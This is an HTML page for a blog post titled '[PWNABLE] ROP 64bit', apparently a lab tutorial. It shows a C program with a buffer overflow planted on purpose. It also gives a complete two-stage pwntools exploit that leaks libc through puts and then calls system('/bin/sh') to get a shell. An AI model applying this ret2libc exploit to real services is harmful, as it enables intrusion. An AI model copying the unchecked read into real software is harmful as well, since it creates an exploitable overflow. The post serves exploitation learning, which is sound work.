@@ -1,0 +1,119 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] ROP 64bit · whrds.log</title><meta name="description" content="※ Please tell us if there is a wrong part. We will fix it after confirmation. ※ In the previous 32-bit, this time we will cover 64-bit. #include void gift(){   asm   (&quot;pop %r9&quot;);   asm   (&quot;pop %r8&quot;);   asm    (&quot;pop %rcx&quot;);   asm   (&quot;pop %rdx&quot;);">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/pwnable-rop-64bit/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-rop-64bit/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-rop-64bit/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] ROP 64bit · whrds.log"><meta property="og:description" content="※ Please tell us if there is a wrong part. We will fix it after confirmation. ※ In the previous 32-bit, this time we will cover 64-bit. #include void gift(){   asm   (&quot;pop %r9&quot;);   asm   (&quot;pop %r8&quot;);   asm    (&quot;pop %rcx&quot;);   asm   (&quot;pop %rdx&quot;);"><meta property="og:url" content="https://whrds.github.io/en/posts/pwnable-rop-64bit/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] ROP 64bit","description":"※ Please tell us if there is a wrong part. We will fix it after confirmation. ※ In the previous 32-bit, this time we will cover 64-bit. #include void gift(){   asm   (\"pop %r9\");   asm   (\"pop %r8\");   asm    (\"pop %rcx\");   asm   (\"pop %rdx\");","datePublished":"2023-12-01","inLanguage":"en","url":"https://whrds.github.io/en/posts/pwnable-rop-64bit/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/pwnable-rop-64bit/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] ROP 64bit</h1><p class="article-description">※ Please tell us if there is a wrong part. We will fix it after confirmation. ※ In the previous 32-bit, this time we will cover 64-bit. #include void gift(){   asm   (&quot;pop %r9&quot;);   asm   (&quot;pop %r8&quot;);   asm    (&quot;pop %rcx&quot;);   asm   (&quot;pop %rdx&quot;);</p><div class="article-meta"><time datetime="2023-12-01">Dec 1, 2023</time><span>·</span><span>1 min read</span></div></header><div class="prose"><p>**※ Please tell us if there is a wrong part. We will fix it after confirmation. *****</p>
+<p>In the previous 32-bit, this time we’ll cover 64-bit.</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+void gift(){
+	 __asm__ (&quot;pop %r9&quot;);
+	__asm__ (&quot;pop %r8&quot;);
+	__asm__ (&quot;pop %rcx&quot;);
+	__asm__ (&quot;pop %rdx&quot;);
+	__asm__ (&quot;pop %rsi&quot;);
+	__asm__ (&quot;pop %rdi&quot;);
+	__asm__ (&quot;ret&quot;);
+	__asm__ (&quot;pop %rax&quot;);
+   	__asm__ (&quot;ret&quot;);
+  	__asm__ (&quot;pop %rbx&quot;);
+ 	__asm__ (&quot;ret&quot;);
+ 	__asm__ (&quot;mov %rbx, (%rax)&quot;);
+ 	__asm__ (&quot;ret&quot;);
+ 	__asm__ (&quot;mov %rax, (%rbx)&quot;);
+ 	__asm__ (&quot;ret&quot;);
+}
+
+int main(){
+	char input[0x50];
+	puts(&quot;Hello! Whrd &quot;);
+
+	read(0,input,0x100);
+	return 0 ;
+}
+</code></pre>
+<p>The following examples have been given only the gadgets.</p>
+<p>In 64-bit, you should not forget to use rdi, rsi, rdx, rcx, r8, r9.</p>
+<p>Because you need to use the register unlike the previous, there is something to configure the chain</p>
+<p>The function that you want to run should be in the register value before running.</p>
+<p>Because it should be heard by gadget -&gt; argument -&gt; function.</p>
+<p>! <a href="/assets/images/tistory/tistory-c12e6171f061/001.png"></a></p>
+<p>buf size is 0x50.</p>
+<p>32-bit and attacking methods will be easy to think because they are similar.</p>
+<p>0x50 + 0x8 + p\ rdi + puts\ got + puts\ plt</p>
+<p>! <a href="/assets/images/tistory/tistory-c12e6171f061/002.png"></a></p>
+<p>The actual address of puts() is output right after main().</p>
+<p>After returning to main(), you can save libc\ base because it has the address of the function differently.</p>
+<p>You can use this to acquire the shell,</p>
+<p>The rest is possible to perform the same bunker as 32-bit.</p>
+<pre><code>from pwn import *
+
+p = process('./rop64')
+e = ELF('./rop64')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+context.log_level = 'debug'
+
+###############################################
+p_rdi = 0x0000000000401165
+ret = 0x000000000040101a
+
+puts_plt = e.plt['puts']
+puts_got = e.got['puts']
+main = e.sym['main']
+
+########## Stage 1 : libc_base ################
+
+payload = b'A'*0x50
+payload += b'B'*0x8
+payload += p64(p_rdi)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main)
+
+p.sendafter(b'Whrd',payload)
+p.recvn(2)
+libc_base = u64(p.recvn(6).ljust(8,b'\x00')) - libc.sym['puts']
+print('libc_base = ', hex(libc_base))
+
+########## Stage 2 : attack ## ################
+
+system = libc_base + libc.sym['system']
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+
+payload = b'A'*0x50
+payload += b'B'*0x8
+payload += p64(ret)
+payload += p64(p_rdi)
+payload += p64(binsh)
+payload += p64(system)
+
+p.sendafter(b'Whrd', payload)
+p.interactive()
+</code></pre>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/pwnable-rop-64bit/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
